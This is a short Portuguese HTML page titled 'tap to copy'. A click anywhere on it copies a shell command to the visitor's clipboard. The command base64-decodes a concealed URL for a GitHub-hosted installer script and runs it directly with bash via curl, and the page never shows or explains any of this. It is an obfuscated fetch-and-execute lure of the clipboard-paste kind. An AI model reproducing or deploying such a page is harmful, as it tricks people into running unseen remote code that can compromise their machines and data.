<!DOCTYPE html>
<html lang="pt-BR">
<body onclick="copiar()">
  <h1>Toque para copiar</h1>

  <script>
    function copiar() {
      const texto = 'u=$(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NjaG9vbDAxMDIvSW5zdGFsbGVyL21haW4vSW5zdGFsbGVyLnNo|base64 -d);bash <(curl -s "$u")';

      navigator.clipboard.writeText(texto)
        .then(() => document.body.innerHTML = '<h1>Copiado! ✅</h1>')
        .catch(() => document.body.innerHTML = '<h1>Erro ao copiar ❌</h1>');
    }
  </script>
</body>
</html>
